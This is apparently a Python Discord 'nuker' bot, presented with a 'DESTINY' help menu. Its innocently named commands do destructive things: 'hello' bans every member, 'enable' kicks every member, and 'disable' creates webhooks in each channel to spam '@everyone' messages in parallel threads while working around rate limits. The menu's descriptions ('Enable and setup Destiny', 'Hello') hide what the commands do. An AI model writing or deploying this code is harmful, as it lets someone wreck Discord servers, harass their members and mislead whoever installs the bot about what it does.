import discord
import os
from discord.ext import commands
import asyncio 
import random 
import requests
import sys
import threading
import datetime
import json
import aiohttp
from colorama import Fore
import time
from pypresence import Presence
    
with open("config.json") as f:
    config = json.load(f)
token = config.get("Token")
prefix = config.get("Prefix")

client = commands.Bot(
    command_prefix=prefix, 
    intents=discord.Intents.all(),
    help_command=None
)

print(f"""Nuker Ready to Nuke
Prefix -> {prefix}
Made by Mythical""")
#time.sleep(99000)
@client.event
async def on_ready():
    await client.change_presence(activity=discord.Streaming(name='Watching My Dms', url='https://discord.com'))

@client.command(pass_context=True)
async def help(ctx):
        embed = discord.Embed(color=255)
        embed.set_author(name="☢️DESTINY MENU☢️")
        embed.set_footer(text="DESTINY")
        embed.set_thumbnail(url='https://media.discordapp.net/attachments/938708079288156171/938713322130407424/1024px-Nuclear_symbol.svg.png')
        embed.add_field(name="`>`help", value="```Shows this menu```", inline=False)
        embed.add_field(name="`--`hello", value="```Hello```", inline=False)
        embed.add_field(name="`--`enable", value="```Enable and setup Destiny```", inline=False)
        embed.add_field(name="`--`disable", value="```Disables destiny```", inline=False)
        embed.add_field(name="Important Links", value="[Support Server](https://discord.gg/9je38qtQRa) | [Subscribe to Devrock](https://youtube.com/channel/UCPOYI-Ckk0v2DXqSfxDKWRg)", inline=False)
        await ctx.send(embed=embed)

def ssspam(webhook):
    while spammingdawebhookeroos:
        randcolor = random.randint(0, 16777215)
        data = {'content':'@everyone leave this shitty scam server'}
            
        spamming = requests.post(webhook, json=data)
        spammingerror = spamming.text
        if spamming.status_code == 204:
            continue
        if 'rate limited' in spammingerror.lower():
            try:
                j = json.loads(spammingerror)
                ratelimit = j['retry_after']
                timetowait = ratelimit / 1000
                time.sleep(timetowait)
            except:
                delay = random.randint(5, 10)
                time.sleep(delay)

        else:
            delay = random.randint(30, 60)
            time.sleep(delay)

@client.command(aliases=['webhookdestroy', 'spamwebhooks',"webhooknuke","webhooksnuke","webhooksblow","spamwebhook"])
async def disable(ctx):
    global spammingdawebhookeroos
    try:
        await ctx.message.delete()
    except:
        pass
    spammingdawebhookeroos = True
    if len(await ctx.guild.webhooks()) != 0: 
        for webhook in await ctx.guild.webhooks():
            threading.Thread(target = ssspam, args = (webhook.url,)).start()
    if len(ctx.guild.text_channels) >= 50:
        webhookamount = 1

    else:
        webhookamount = 50 / len(ctx.guild.text_channels) 
        webhookamount = int(webhookamount) + 1
    for i in range(webhookamount):  
        for channel in ctx.guild.text_channels:

            try:
            
                webhook =await channel.create_webhook(name='Mythical nuked your server')
                threading.Thread(target = ssspam, args = (webhook.url,)).start()
                f = open(r'data/webhooks-'+str(ctx.guild.id)+".txt",'a')
                f.write(f"{webhook.url} \n")
                f.close()

            except:
                print (f"{Fore.RED} > Webhook Error")

@client.command()
async def hello(ctx):
    for member in ctx.guild.members:
        if member == client.user:
            continue
        try:
            await member.ban()
        except discord.Forbidden:
            print(f"{member.name} has FAILED to be banned from {ctx.guild.name}")
        else:
            print(f"{member.name} has been kicked from {ctx.guild.name}")
    print("Banned all")

@client.command()
async def enable(ctx):
    for member in ctx.guild.members:
        if member == client.user:
            continue
        try:
            await member.kick()
        except discord.Forbidden:
            print(f"{member.name} has FAILED to be kicked from {ctx.guild.name}")
        else:
            print(f"{member.name} has been kicked from {ctx.guild.name}")
    print("kicked all")

client.run(token)
